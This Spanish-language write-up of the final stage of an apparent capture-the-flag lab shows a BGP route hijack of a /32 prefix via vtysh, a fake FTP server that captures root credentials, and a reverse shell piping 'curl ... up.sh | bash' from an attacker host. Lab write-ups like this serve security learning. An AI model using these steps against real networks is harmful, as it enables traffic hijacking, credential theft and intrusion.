| 6  | Closed | Rx / CastCom. IP Engineering team from one of our upstream ISP called to report a problem with some of their routes being leaked again due to a misconfiguration on our end. Update 2018/06/13: Pb solved: Junior Net Engineer Mike D. was terminated yesterday. Updated: 2018/06/15: CastCom. still reporting issues with 3 networks: 10.120.15,10.120.16,10.120.17/24's, one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network, investigating... Updated 2018/06/16: No prbl. found, suspect they had stuck routes after the leak and cleared them manually. |

Con esto terminamos de cerrar algunos cabos; debemos replicar el route leak de la red 10.120.15.0/24 ubicado en el AS 300, en el cual se ubica un servidor FTP.

# Network ICMP scanning

Necesitamos averiguar cual es la dirección del servidor IP, pero como es un contenedor muy limitado, no tenemos herramientas a primera mano a menos que hagamos un pequeño script o mejor aun, usemos uno de [commandlinefu](https://www.commandlinefu.com/commands/view/5298/ping-scanning-without-nmap):

``` text
root@r1:~# for i in {1..254}; do ping -c 1 -W 1 10.120.15.$i | grep 'from'; done
<}; do ping -c 1 -W 1 10.120.15.$i | grep 'from'; done
64 bytes from 10.120.15.10: icmp_seq=1 ttl=64 time=0.085 ms
```

Básicamente tira **un** ping a cada dirección dentro de una red de 24 bits. Después de hacer un ftp al servidor vemos un banner de vsftpd.

Con esto hemos encontrado nuestro target, el servidor 10.120.15.10.

# Crontab for root

Después de explorar y explorar sobre la maquina, intentar varias veces el route-leak y fallar o tardar mucho, me tope con este cronjob:

``` text
root@r1:~# cat /var/spool/cron/crontabs/root
cat /var/spool/cron/crontabs/root
# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.m6zD7R/crontab installed on Mon Jul  2 16:40:23 2018)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command
*/10 * * * * /opt/restore.sh
root@r1:~# cat /opt/restore.sh
cat /opt/restore.sh
#!/bin/sh
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga
```

Básicamente y a pesar de ser root, decidí no intervenir y trabajar con lo que tenia sobre la maquina. El script `restore.sh` se ejecuta cada 10 min cortando cualquier intento de afectar la operación por defecto de la maquina. En los servidores free ya era un infierno ):

# Quickly, a route leak + ftp-server!

Cree un script para realizar la conexión lo mas rápido y eficiente posible:

``` bash
#!/bin/bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export SHELL=bash && export TERM=xterm-256color
ip link add dummy1 type dummy
ip addr add 10.120.15.10/32 dev dummy1
ip link set dummy1 up
printf "conf t\nrouter bgp 100\nnetwork 10.120.15.10/32\nexit\nexit\nwr mem\nsh ip bgp\nexit\n" | vtysh
wget -O /dev/shm/utils.py http://10.10.13.170:4001/utils.py && wget -O /dev/shm/ftp_server.py http://10.10.13.170:4001/ftp_server.py
cd /dev/shm/ && python3 ftp_server.py
```

Básicamente:
- Crea una interface virtual dummy
- Configura el router para anunciar como network la interface virtual (route leak)
- Descarga una implementación de un ftp server para python3 y lo ejecuta.

En otra terminal puse el listener del reverse shell para llamar al script de bash `up.sh` desde un web server.

Veamos que ocurrió:

``` text
xbytemx@laptop:~$ ncat -lnvp 3001
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3001
Ncat: Listening on 0.0.0.0:3001
Ncat: Connection from 10.10.10.105.
Ncat: Connection from 10.10.10.105:44988.
bash: cannot set terminal process group (7411): Inappropriate ioctl for device
bash: no job control in this shell
root@as100:/dev/shm# curl http://10.10.13.170:4001/up.sh | bash
curl http://10.10.13.170:4001/up.sh | bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   474  100   474    0     0    707      0 --:--:-- --:--:-- --:--:--   707
export SHELL=bash && export TERM=xterm-256color
ip link add dummy1 type dummy
ip addr add 10.120.15.10/32 dev dummy1
ip link set dummy1 up
printf "conf t\nrouter bgp 100\nnetwork 10.120.15.10/32\nexit\nexit\nwr mem\nsh ip bgp\nexit\n" | vtysh
wget -O /dev/shm/utils.py http://10.10.13.170:4001/utils.py && wget -O /dev/shm/ftp_server.py http://10.10.13.170:4001/ftp_server.py
cd /dev/shm/ && python3 ftp_server.py
root@as100:/dev/shm# export SHELL=bash && export TERM=xterm-256color
root@as100:/dev/shm# ip link add dummy1 type dummy
RTNETLINK answers: File exists
root@as100:/dev/shm# ip addr add 10.120.15.10/32 dev dummy1
RTNETLINK answers: File exists
root@as100:/dev/shm# ip link set dummy1 up
it\nexit\nwr mem\nsh ip bgp\nexit\n" | vtyshbgp 100\nnetwork 10.120.15.10/32\nex

Hello, this is Quagga (version 0.99.24.1).
Copyright 1996-2005 Kunihiro Ishiguro, et al.

as100# conf t
as100(config)# router bgp 100
as100(config-router)# network 10.120.15.10/32
as100(config-router)# exit
as100(config)# exit
as100# wr mem
Building Configuration...
Configuration saved to /etc/quagga/zebra.conf
Configuration saved to /etc/quagga/bgpd.conf
[OK]
as100# sh ip bgp
BGP table version is 0, local router ID is 10.255.255.1
Status codes: s suppressed, d damped, h history, * valid, > best, = multipath,
              i internal, r RIB-failure, S Stale, R Removed
Origin codes: i - IGP, e - EGP, ? - incomplete

   Network          Next Hop            Metric LocPrf Weight Path
*> 10.78.10.0/24    0.0.0.0                  0         32768 ?
*> 10.78.11.0/24    0.0.0.0                  0         32768 ?
*> 10.99.64.0/24    0.0.0.0                  0         32768 ?
*  10.100.10.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.11.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.12.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.13.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.14.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.15.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.16.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.17.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.18.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.19.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*  10.100.20.0/24   10.78.11.2                             0 300 200 i
*>                  10.78.10.2               0             0 200 i
*> 10.101.8.0/21    0.0.0.0                  0         32768 i
*> 10.101.16.0/21   0.0.0.0                  0         32768 i
*> 10.120.10.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.11.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.12.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.13.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.14.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.15.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*  10.120.15.10/32  0.0.0.0                  0         32768 i
*>                  0.0.0.0                  0         32768 ?
*> 10.120.16.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.17.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.18.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.19.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i
*> 10.120.20.0/24   10.78.11.2               0             0 300 i
*                   10.78.10.2                             0 200 300 i

Total number of prefixes 28
as100# exit
 -O /dev/shm/ftp_server.py http://10.10.13.170:4001/ftp_server.pytils.py && wget
root@as100:/dev/shm# cd /dev/shm/ && python3 ftp_server.py
2019-03-06 04-48-17 [-] Start ftp server: Enter q or Q to stop ftpServer...
2019-03-06 04-48-17 [-] Server started: Listen on: 10.120.15.10, 21
```

Excelente, ya tenemos el listener y el anuncio sobre BGP, esperemos a ver si engañamos a alguien:

``` text
2019-03-06 04-48-17 [-] Start ftp server: Enter q or Q to stop ftpServer...
2019-03-06 04-48-17 [-] Server started: Listen on: 10.120.15.10, 21
2019-03-06 04-49-01 [-] Accept: Created a new connection 10.78.10.2, 35248
2019-03-06 04-49-01 [-] Received data: USER root
2019-03-06 04-49-01 [-] USER: root
2019-03-06 04-49-01 [-] Received data: PASS BGPtelc0rout1ng
2019-03-06 04-49-01 [-] PASS: BGPtelc0rout1ng
2019-03-06 04-49-01 [-] Received data: SYST
2019-03-06 04-49-01 [-] SYS: None
2019-03-06 04-49-01 [-] Received data: PASV
2019-03-06 04-49-01 [-] PASV: None
2019-03-06 04-49-01 [-] Received data: STOR secretdata.txt
2019-03-06 04-49-01 [-] STOR: /root/secretdata.txt
2019-03-06 04-49-01 [-] Receive: 'FtpServerProtocol' object has no attribute 'mode'
2019-03-06 04-49-01 [-] Received data: QUIT
2019-03-06 04-49-01 [-] QUIT: None
2019-03-06 04-49-01 [-] Received data:
```

Holy Guacamoly, una maquina del AS 100 se trato de conectar! De esas que estamos redistribuyendo.

Con eso logramos obtener las credenciales de root.

> creds: root / BGPtelc0rout1ng

Ahora, ¿cómo usamos esas credenciales? Fácil por ssh hacia el host intervenido (spoiler, borre la interface y ejecute restore.sh):

``` text
root@as100:~# export SHELL=bash && export TERM=xterm-256color
root@as100:~# ssh root@10.120.15.10
ssh root@10.120.15.10
root@10.120.15.10's password: BGPtelc0rout1ng

Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar  6 04:54:35 UTC 2019

  System load:  0.12               Users logged in:       0
  Usage of /:   40.8% of 19.56GB   IP address for ens33:  10.10.10.105
  Memory usage: 58%                IP address for lxdbr0: 10.99.64.1
  Swap usage:   2%                 IP address for lxdbr1: 10.120.15.10
  Processes:    391


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
0 updates are security updates.


Last login: Wed Sep  5 14:32:15 2018
root@carrier:~# ls
ls
root.txt  secretdata.txt
```

# `cat root.txt`

``` text
root@carrier:~# cat root.txt
cat root.txt
```

... and we got root flag and user flag.

---

Gracias por llegar hasta aquí, hasta la próxima!
